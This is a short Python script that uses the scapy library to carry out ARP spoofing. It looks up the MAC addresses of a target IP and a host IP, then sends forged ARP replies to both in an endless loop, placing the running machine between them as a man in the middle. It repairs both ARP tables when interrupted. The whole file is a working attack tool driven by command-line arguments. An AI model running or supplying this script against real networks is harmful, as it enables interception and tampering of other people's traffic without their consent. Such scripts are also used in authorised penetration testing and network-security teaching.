from scapy.all import *
import argparse
import sys
from time import sleep

def getMAC(ip):     # Get MAC of machine given it's IP
    arp = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    result = srp(packet, timeout=3, verbose=False)
    return result[0][0][1].hwsrc

def poison(targetIP, targetMAC, sourceIP):
    packet = ARP(op=2 , pdst=targetIP, psrc=sourceIP, hwdst= targetMAC)
    send(packet, verbose= False)

def restore(targetIP, targetMAC, sourceIP, sourceMAC):
    packet = ARP(op=2 , hwsrc=sourceMAC , psrc= sourceIP, hwdst= targetMAC , pdst= targetIP)
    send(packet, verbose=False)

if __name__ == '__main__':
    # Argument parser 
    parser = argparse.ArgumentParser(description='Spoof target\'s ARP table') 
    parser.add_argument('-t', action='store', dest='target', help='Target IP')
    parser.add_argument('-r', action='store', dest='host', help='Host IP')
    args = parser.parse_args()

    # ARP Spoofing
    try:
        targetIP = args.target
        hostIP = args.host
        targetMAC = getMAC(targetIP)
        hostMAC = getMAC(hostIP)
        while 1:
            poison(targetIP, targetMAC, hostIP)
            poison(hostIP, hostMAC, targetIP)
            sleep(2)
    except KeyboardInterrupt:
        restore(targetIP, targetMAC, hostIP, hostMAC)
        restore(hostIP, hostMAC, targetIP, targetMAC)